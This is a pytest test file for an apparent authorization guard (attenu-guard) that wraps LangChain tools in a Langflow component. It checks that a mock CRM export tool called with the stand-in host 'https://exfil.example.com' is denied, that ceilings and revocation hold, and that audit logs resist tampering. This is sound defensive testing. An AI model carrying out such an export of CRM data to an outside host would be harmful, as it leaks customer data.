"""attenu-guard x Langflow — component tests.

The component lives under `examples/integrations/langflow/`, which is not an
installed package, so it is loaded from that path.

Split in two:
  * the pure-logic half (authority/scope parsing and the LangChain tool
    wrapper) needs only `langchain_core`, and is exercised with Langflow
    absent;
  * the component half needs `lfx` (or `langflow`) and is skipped when neither
    is importable.

Assertions read a side-effect ledger, not internal call counts: what is being
tested is that the denied tool's BODY never ran.
"""
from __future__ import annotations

import asyncio
import importlib.util
import sys

from pathlib import Path
from typing import List

import pytest

pytest.importorskip("langchain_core")

from langchain_core.tools import StructuredTool  # noqa: E402
from pydantic import BaseModel, Field  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    AuthorityDenied,
    Guard,
    ReasonCode,
    RowLimit,
)

_COMPONENT = (Path(__file__).resolve().parents[2]
              / "examples" / "integrations" / "langflow"
              / "attenu_guard_component.py")


def _load():
    spec = importlib.util.spec_from_file_location(
        "attenu_guard_langflow_component", _COMPONENT)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def _make_warning_registry_readable() -> List[str]:
    """Repair `__warningregistry__` on modules that raise when it is read.

    `unittest.TestCase.assertWarns` walks `sys.modules` and reads
    `__warningregistry__` off every module it finds. `langchain_classic.tools`
    (pulled in by `lfx`) defines a module-level `__getattr__` that raises
    `ModuleNotFoundError` for any name it does not recognise —
    `__warningregistry__` included — so simply having imported it makes
    `assertWarns` raise anywhere in the process, in suites that have nothing to
    do with Langflow. Giving those modules a real empty registry restores the
    behaviour `unittest` expects, and changes nothing else.
    """
    patched = []
    for name, module in list(sys.modules.items()):
        if module is None:
            continue
        try:
            getattr(module, "__warningregistry__", None)
        except Exception:      # noqa: BLE001 - any raising __getattr__ counts
            try:
                module.__warningregistry__ = {}
                patched.append(name)
            except Exception:  # noqa: BLE001 - nothing more we can do
                pass
    return patched


comp = _load()
PATCHED_REGISTRIES = _make_warning_registry_readable()

HAS_LANGFLOW = comp.AttenuGuardToolsComponent is not None
requires_langflow = pytest.mark.skipif(
    not HAS_LANGFLOW, reason="neither lfx nor langflow is installed")


# ---------------------------------------------------------------------------
# Tools. EFFECTS is the ground truth: it records what actually EXECUTED.
# ---------------------------------------------------------------------------
class Ledger:
    def __init__(self) -> None:
        self.effects: List[tuple] = []


class _QueryArgs(BaseModel):
    rows: int = Field(..., description="How many CRM rows to read.")


class _ExportArgs(BaseModel):
    destination: str = Field(..., description="Destination URL.")


def make_tools(ledger: Ledger):
    def crm_query(rows: int) -> str:
        ledger.effects.append(("crm_query", rows))
        return f"read {rows} CRM rows"

    def crm_export(destination: str) -> str:
        ledger.effects.append(("crm_export", destination))
        return f"exported CRM to {destination}"

    return (
        StructuredTool.from_function(
            func=crm_query, name="crm_query",
            description="Read rows from the CRM.",
            args_schema=_QueryArgs, infer_schema=False),
        StructuredTool.from_function(
            func=crm_export, name="crm_export",
            description="Export the whole CRM to an external destination.",
            args_schema=_ExportArgs, infer_schema=False),
    )


ORCHESTRATOR = '{"scopes": ["crm.*"], "ceilings": {"max_rows": 100000, ' \
               '"egress": "any"}, "ttl": 3600}'
SUMMARIZER = '{"scopes": ["crm.read"], "ceilings": {"max_rows": 5000, ' \
             '"egress": "none"}, "ttl": 900}'
SCOPES = '{"crm_query": "crm.read", "crm_export": "crm.export"}'


# ===========================================================================
# Pure logic — no Langflow needed
# ===========================================================================

def test_parse_authority_builds_scopes_ceilings_and_ttl():
    authority = comp.parse_authority(SUMMARIZER)
    assert set(authority.scopes) == {"crm.read"}
    assert authority.ceiling("max_rows").max_rows == 5000
    assert authority.ttl == 900


def test_parse_authority_rejects_a_misspelt_ceiling_rather_than_ignoring_it():
    """Silently dropping an unknown key would leave the agent unbounded there."""
    with pytest.raises(ValueError) as exc:
        comp.parse_authority('{"scopes": ["crm.read"], '
                             '"ceilings": {"max_row": 5000}}')
    assert "max_row" in str(exc.value)


@pytest.mark.parametrize("text", ["", "   ", "not json", "[1, 2]",
                                  '{"scopes": []}'])
def test_parse_authority_refuses_an_empty_or_broken_field(text):
    with pytest.raises(ValueError):
        comp.parse_authority(text)


def test_parse_scopes_round_trips_and_rejects_a_non_map():
    assert comp.parse_scopes(SCOPES) == {"crm_query": "crm.read",
                                         "crm_export": "crm.export"}
    assert comp.parse_scopes("") == {}
    with pytest.raises(ValueError):
        comp.parse_scopes('{"crm_query": 3}')


def test_guarded_tool_denies_before_the_body_runs():
    ledger = Ledger()
    _, crm_export = make_tools(ledger)
    guard = Guard.issue("summarizer", comp.parse_authority(SUMMARIZER),
                        task="summarise")

    guarded = comp.guard_langchain_tool(crm_export, lambda: guard, "crm.export")
    with pytest.raises(AuthorityDenied):
        guarded.invoke({"destination": "https://exfil.example.com"})
    assert ledger.effects == []


def test_guarded_tool_runs_the_body_when_the_authority_is_held():
    """The adapter-test trap: a wrapper that denies everything looks 'secure'."""
    ledger = Ledger()
    crm_query, crm_export = make_tools(ledger)
    guard = Guard.issue("orchestrator", comp.parse_authority(ORCHESTRATOR),
                        task="Q3")

    q = comp.guard_langchain_tool(crm_query, lambda: guard, "crm.read")
    e = comp.guard_langchain_tool(crm_export, lambda: guard, "crm.export")
    assert q.invoke({"rows": 10}) == "read 10 CRM rows"
    assert e.invoke({"destination": "s3://reports"}) == "exported CRM to s3://reports"
    assert ledger.effects == [("crm_query", 10), ("crm_export", "s3://reports")]


def test_ceilings_are_enforced_not_just_scopes():
    ledger = Ledger()
    crm_query, _ = make_tools(ledger)
    guard = Guard.issue("summarizer", comp.parse_authority(SUMMARIZER),
                        task="summarise")
    guarded = comp.guard_langchain_tool(crm_query, lambda: guard, "crm.read",
                                        context_fn=lambda rows: {"rows": rows})

    assert guarded.invoke({"rows": 10}) == "read 10 CRM rows"
    with pytest.raises(AuthorityDenied):
        guarded.invoke({"rows": 50_000})       # ceiling is 5_000
    assert ledger.effects == [("crm_query", 10)]


def test_the_async_path_authorizes_too():
    ledger = Ledger()
    crm_query, crm_export = make_tools(ledger)
    guard = Guard.issue("summarizer", comp.parse_authority(SUMMARIZER),
                        task="summarise")
    ok = comp.guard_langchain_tool(crm_query, lambda: guard, "crm.read")
    bad = comp.guard_langchain_tool(crm_export, lambda: guard, "crm.export")

    assert asyncio.run(ok.ainvoke({"rows": 7})) == "read 7 CRM rows"
    with pytest.raises(AuthorityDenied):
        asyncio.run(bad.ainvoke({"destination": "https://exfil.example.com"}))
    assert ledger.effects == [("crm_query", 7)]


def test_on_denied_return_hands_the_reason_to_the_model():
    ledger = Ledger()
    _, crm_export = make_tools(ledger)
    guard = Guard.issue("summarizer", comp.parse_authority(SUMMARIZER),
                        task="summarise")
    guarded = comp.guard_langchain_tool(crm_export, lambda: guard, "crm.export",
                                        on_denied="return")

    out = guarded.invoke({"destination": "https://exfil.example.com"})
    assert ReasonCode.SCOPE_NOT_GRANTED in out
    assert ledger.effects == []


def test_the_wrapper_preserves_the_model_facing_schema():
    ledger = Ledger()
    crm_query, _ = make_tools(ledger)
    guard = Guard.issue("orchestrator", comp.parse_authority(ORCHESTRATOR),
                        task="Q3")
    guarded = comp.guard_langchain_tool(crm_query, lambda: guard, "crm.read")

    assert guarded.name == crm_query.name
    assert guarded.description == crm_query.description
    assert guarded.args == crm_query.args


def test_an_unpriced_tool_fails_closed():
    ledger = Ledger()
    crm_query, crm_export = make_tools(ledger)
    guard = Guard.issue("orchestrator", comp.parse_authority(ORCHESTRATOR),
                        task="Q3")

    with pytest.raises(comp.UnpricedToolError) as exc:
        comp.guard_langchain_tools([crm_query, crm_export], lambda: guard,
                                   {"crm_query": "crm.read"})
    assert "crm_export" in str(exc.value)

    passed = comp.guard_langchain_tools([crm_query, crm_export], lambda: guard,
                                        {"crm_query": "crm.read"},
                                        on_unmapped="allow")
    assert passed[1] is crm_export      # unwrapped, by explicit choice


def test_revocation_after_the_flow_was_built_is_seen_by_the_next_call():
    """The Guard is resolved per invocation, not captured when wrapped."""
    ledger = Ledger()
    crm_query, _ = make_tools(ledger)
    root = Guard.issue("orchestrator", comp.parse_authority(ORCHESTRATOR),
                       task="Q3")
    child = root.delegate("summarizer", comp.parse_authority(SUMMARIZER),
                          task="summarise")
    guarded = comp.guard_langchain_tool(crm_query, lambda: child, "crm.read")

    assert guarded.invoke({"rows": 10}) == "read 10 CRM rows"
    root.revoke(child.node_id)
    with pytest.raises(AuthorityDenied):
        guarded.invoke({"rows": 10})
    assert ledger.effects == [("crm_query", 10)]


def test_evidence_payload_carries_the_graph_and_a_verifiable_log():
    ledger = Ledger()
    crm_query, crm_export = make_tools(ledger)
    root = Guard.issue("orchestrator", comp.parse_authority(ORCHESTRATOR),
                       task="Q3")
    child = root.delegate("summarizer", comp.parse_authority(SUMMARIZER),
                          task="summarise")
    comp.guard_langchain_tool(crm_query, lambda: child, "crm.read"
                              ).invoke({"rows": 10})
    with pytest.raises(AuthorityDenied):
        comp.guard_langchain_tool(crm_export, lambda: child, "crm.export"
                                  ).invoke({"destination": "https://exfil.example.com"})

    payload = comp.evidence_payload(root)
    assert payload["verified"] is True
    assert {d["event"] for d in payload["decisions"]} == {"allow", "deny"}
    assert [n["agent"] for n in payload["graph"]["nodes"]] == [
        "orchestrator", "summarizer"]

    tampered = [dict(e) for e in payload["audit_log"]]
    breach = next(i for i, e in enumerate(tampered) if e["event"] == "deny")
    tampered[breach]["event"] = "allow"
    ok, _ = AuditLog.verify(tampered)
    assert not ok


# ===========================================================================
# The component — needs lfx (or langflow)
# ===========================================================================

def _component(**fields):
    """Build the component and set its input fields directly.

    Langflow populates these attributes from the visual editor; setting them
    here exercises the same code the editor would reach.
    """
    c = comp.AttenuGuardToolsComponent()
    defaults = dict(tools=[], parent_guard=None, agent_id="agent", task="",
                    authority=ORCHESTRATOR, tool_scopes=SCOPES,
                    on_denied="raise", on_unmapped="deny")
    defaults.update(fields)
    for key, value in defaults.items():
        setattr(c, key, value)
    return c


@requires_langflow
def test_component_issues_a_root_guard_when_no_parent_is_connected():
    c = _component(agent_id="orchestrator", task="Q3 board report")
    guard = c.build_guard()

    assert guard.agent_id == "orchestrator"
    assert set(guard.authority.scopes) == {"crm.*"}
    assert c.build_guard() is guard          # memoized: one Guard, one log


@requires_langflow
def test_connecting_the_guard_output_delegates_and_can_only_narrow():
    parent = _component(agent_id="orchestrator", authority=ORCHESTRATOR)
    root = parent.build_guard()

    greedy = '{"scopes": ["crm.*", "iam.admin"], ' \
             '"ceilings": {"max_rows": 10000000}, "ttl": 86400}'
    child_c = _component(agent_id="summarizer", parent_guard=root,
                         authority=greedy, task="summarise")
    child = child_c.build_guard()

    assert child.is_narrower_than(root)
    assert set(child.authority.scopes) == {"crm.*"}          # iam.admin dropped
    assert child.authority.ceiling("max_rows").max_rows == 100_000
    assert child.authority.ttl == 3600


@requires_langflow
def test_a_parent_handle_arriving_as_a_list_is_accepted():
    parent = _component(agent_id="orchestrator").build_guard()
    child = _component(agent_id="summarizer", parent_guard=[parent],
                       authority=SUMMARIZER).build_guard()
    assert child.is_narrower_than(parent)


@requires_langflow
def test_a_non_guard_on_the_parent_port_is_refused():
    c = _component(parent_guard="not a guard")
    with pytest.raises(TypeError):
        c.build_guard()


@requires_langflow
def test_build_guarded_tools_denies_the_export_and_allows_the_read():
    ledger = Ledger()
    crm_query, crm_export = make_tools(ledger)
    parent = _component(agent_id="orchestrator").build_guard()
    c = _component(agent_id="summarizer", parent_guard=parent,
                   authority=SUMMARIZER, tools=[crm_query, crm_export])

    by_name = {t.name: t for t in c.build_guarded_tools()}
    assert by_name["crm_query"].invoke({"rows": 10}) == "read 10 CRM rows"
    with pytest.raises(AuthorityDenied):
        by_name["crm_export"].invoke({"destination": "https://exfil.example.com"})
    assert ledger.effects == [("crm_query", 10)]


@requires_langflow
def test_build_guarded_tools_fails_closed_on_a_tool_with_no_scope():
    ledger = Ledger()
    crm_query, crm_export = make_tools(ledger)
    c = _component(tools=[crm_query, crm_export],
                   tool_scopes='{"crm_query": "crm.read"}')
    with pytest.raises(comp.UnpricedToolError):
        c.build_guarded_tools()


@requires_langflow
def test_the_evidence_output_re_verifies_the_audit_log():
    ledger = Ledger()
    crm_query, crm_export = make_tools(ledger)
    parent_c = _component(agent_id="orchestrator")
    root = parent_c.build_guard()
    child_c = _component(agent_id="summarizer", parent_guard=root,
                         authority=SUMMARIZER, tools=[crm_query, crm_export])
    by_name = {t.name: t for t in child_c.build_guarded_tools()}
    by_name["crm_query"].invoke({"rows": 10})
    with pytest.raises(AuthorityDenied):
        by_name["crm_export"].invoke({"destination": "https://exfil.example.com"})

    data = parent_c.build_evidence()
    payload = data.data
    assert payload["verified"] is True
    events = [(d["event"], d["scope"]) for d in payload["decisions"]]
    assert ("allow", "crm.read") in events
    assert ("deny", "crm.export") in events


@requires_langflow
def test_the_component_declares_the_ports_the_editor_needs():
    c = comp.AttenuGuardToolsComponent()
    inputs = {i.name: i for i in c.inputs}
    assert inputs["tools"].input_types == ["Tool"]
    assert inputs["parent_guard"].input_types == ["AttenuGuard"]
    assert {o.name for o in c.outputs} == {"guarded_tools", "guard", "evidence"}
    for output in c.outputs:
        assert hasattr(c, output.method)
